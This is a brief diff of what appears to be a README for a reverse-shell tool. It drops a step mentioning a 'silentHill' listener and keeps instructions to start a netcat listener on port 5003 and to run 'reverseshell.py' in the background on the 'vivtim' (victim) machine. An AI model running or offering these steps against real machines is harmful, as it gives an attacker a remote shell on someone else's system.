@@ -29,11 +29,6 @@ Or download the zip:
 nc -lnvp 5003
 ```
 
-- or use the silentHill listener:
-```
-python3 silentHill.py
-```
-
 - On the vivtim machine:
 ```
 python3 reverseshell.py &
